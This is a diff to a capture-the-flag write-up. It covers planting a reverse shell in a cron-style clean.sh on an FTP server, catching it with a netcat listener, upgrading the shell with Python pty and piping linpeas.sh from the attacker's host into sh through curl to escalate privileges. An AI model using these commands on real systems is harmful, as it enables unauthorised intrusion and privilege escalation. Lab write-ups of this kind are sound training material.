@@ -52,7 +52,7 @@ Download the clean.sh script,
 hide a command for a reverseshell inside 
 -> Place to find a reverseshell https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 
-[![https://imgur.com/PGjuW07.png](https://imgur.com/PGjuW07.png)](https://imgur.com/PGjuW07.png)
+[![https://imgur.com/MYn1gRG.png](https://imgur.com/MYn1gRG.png)](https://imgur.com/MYn1gRG.png)
 
 and replace the one on the ftp server with ours.
 
@@ -60,10 +60,25 @@ and replace the one on the ftp server with ours.
 
 Now we only need to setup a nc listener and wait a bit, we are in!
 
+[![https://imgur.com/cr43x7b.png](https://imgur.com/cr43x7b.png)](https://imgur.com/cr43x7b.png)
 
-## Persistence
+First lets get a better shell and then escalate our privileges!
 
-## Privilege-escalation
+We can use python for that: python -c 'import pty; pty.spawn("/bin/bash")'
+
+##Privilege Escalation
+
+After looking for the most common places to escalate i didn't find anything and decided to make my life easier by setting up a http server on my host machine and curl linpeas.sh on the target.
+
+[![https://imgur.com/32WBOx6.png](https://imgur.com/32WBOx6.png)](https://imgur.com/32WBOx6.png)
+
+With the command:
+
+curl http://your_ip:8000/linpeas.sh | sh you can get linpeas.sh and execute it.
+
+(Of course you need to download it first https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
 
+[![https://imgur.com/pLoEbad.png](https://imgur.com/pLoEbad.png)](https://imgur.com/pLoEbad.png)
+[![https://imgur.com/icZAOXp.png](https://imgur.com/icZAOXp.png)](https://imgur.com/icZAOXp.png)
 
